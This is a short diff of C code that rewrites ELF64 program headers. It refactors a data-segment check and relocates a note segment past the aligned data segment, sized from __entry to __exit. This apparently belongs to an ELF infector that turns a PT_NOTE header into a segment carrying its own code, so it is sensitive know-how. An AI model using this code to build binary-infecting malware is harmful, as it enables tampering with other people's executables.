@@ -18,10 +18,7 @@ __attribute__((always_inline)) static inline Elf64_Phdr *get_segment(const struc
 
 __attribute__((always_inline)) static inline bool is_data_segment(const Elf64_Phdr *segment)
 {
-	if (segment->p_type != PT_LOAD)
-		return false;
-
-	return segment->p_flags == (PF_W | PF_R);
+	return segment->p_type == PT_LOAD && segment->p_flags == (PF_W | PF_R);
 }
 
 __attribute__((always_inline)) static inline bool is_note_segment(const Elf64_Phdr *segment)
@@ -33,10 +30,11 @@ __attribute__((always_inline)) static inline void update_note_segment(Elf64_Phdr
 {
 	const size_t base = segment[DATA]->p_vaddr + segment[DATA]->p_memsz;
 	const size_t padding = base % segment[DATA]->p_align;
+	const size_t offset = base + (segment[DATA]->p_align - padding);
 
-	segment[NOTE]->p_vaddr = base + (segment[DATA]->p_align - padding);
-	segment[NOTE]->p_paddr = segment[NOTE]->p_vaddr;
-	segment[NOTE]->p_offset = base - padding;
+	segment[NOTE]->p_vaddr = offset;
+	segment[NOTE]->p_paddr = offset;
+	segment[NOTE]->p_offset = offset;
 
 	segment[NOTE]->p_filesz = (void *)__exit - (void *)__entry;
 	segment[NOTE]->p_memsz = (void *)__exit - (void *)__entry;
